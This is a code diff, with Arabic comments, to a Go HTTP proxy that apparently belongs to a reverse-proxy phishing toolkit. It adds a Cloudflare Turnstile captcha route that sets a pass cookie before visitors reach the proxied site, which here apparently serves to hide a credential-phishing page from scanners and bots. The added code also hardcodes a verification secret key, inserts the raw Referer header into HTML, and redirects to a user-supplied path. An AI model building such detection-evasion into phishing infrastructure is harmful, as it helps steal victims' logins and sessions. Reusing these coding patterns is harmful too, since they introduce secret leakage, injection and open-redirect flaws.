@@ -170,6 +170,165 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+			
+			// معالجة مباشرة لمسار verify_captcha
+			if req.URL.Path == "/verify_captcha" {
+				// السماح بالطلبات POST
+				if req.Method == "POST" {
+					err := req.ParseForm()
+					if err == nil {
+						// التحقق من رمز Turnstile 
+						token := req.FormValue("cf-turnstile-response")
+						if token != "" {
+							// بناء طلب للتحقق من الكابتشا
+							client := &http.Client{Timeout: 10 * time.Second}
+							
+							verification_data := url.Values{}
+							verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
+							verification_data.Set("response", token)
+							verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
+							
+							verification_resp, err := client.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", verification_data)
+							if err == nil {
+								defer verification_resp.Body.Close()
+								var result map[string]interface{}
+								if err := json.NewDecoder(verification_resp.Body).Decode(&result); err == nil {
+									if success, ok := result["success"].(bool); ok && success {
+										// نجح التحقق، وضع الكوكي وإعادة التوجيه
+										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+										if resp != nil {
+											expiration := time.Now().Add(24 * time.Hour)
+											cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
+											resp.Header.Set("Set-Cookie", cookie.String())
+											
+											// تحديد المسار الذي سيتم إعادة التوجيه إليه
+											redirectPath := req.FormValue("redirect_path")
+											if redirectPath == "" {
+												redirectPath = "/"
+											}
+											resp.Header.Set("Location", redirectPath)
+											return req, resp
+										}
+									}
+								}
+							}
+						}
+					}
+					// في حالة الفشل، عرض صفحة الكابتشا مرة أخرى مع رسالة خطأ
+					captchaHTML := `<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .error {
+            color: #e53935;
+            margin-top: 15px;
+        }
+    </style>
+    <script>
+        function onCaptchaSuccess(token) {
+            document.getElementById('captcha-form').submit();
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="error">تعذر التحقق، يرجى المحاولة مرة أخرى</div>
+        <form id="captcha-form" action="/verify_captcha" method="POST">
+            <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
+            <div class="captcha-container">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+            </div>
+        </form>
+    </div>
+</body>
+</html>`
+					
+					resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
+					return req, resp
+				}
+				// معالجة طلبات GET لصفحة التحقق
+				captchaHTML := `<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+    </style>
+    <script>
+        function onCaptchaSuccess(token) {
+            document.getElementById('captcha-form').submit();
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <form id="captcha-form" action="/verify_captcha" method="POST">
+            <input type="hidden" name="redirect_path" value="/">
+            <div class="captcha-container">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+            </div>
+        </form>
+    </div>
+</body>
+</html>`
+				
+				resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
+				return req, resp
+			}
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
